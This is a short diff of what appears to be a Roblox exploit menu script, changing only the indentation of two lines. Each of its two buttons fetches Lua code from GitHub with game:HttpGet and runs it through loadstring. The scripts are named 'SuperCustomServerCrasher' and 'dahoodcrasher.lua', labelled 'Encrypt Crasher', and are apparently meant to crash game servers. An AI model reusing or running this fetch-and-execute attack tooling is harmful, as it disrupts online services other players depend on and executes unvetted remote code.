@@ -33,7 +33,7 @@ script1.TextColor3 = Color3.fromRGB(255, 255, 255)
 script1.TextSize = 14.000
 script1.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
 script1.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
 end)
 
 script2.Name = "script2"
@@ -47,7 +47,7 @@ script2.Text = "Encrypt Crasher"
 script2.TextColor3 = Color3.fromRGB(255, 255, 255)
 script2.TextSize = 14.000
 script2.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua"))()
 end)
 
 TextLabel.Parent = Frame
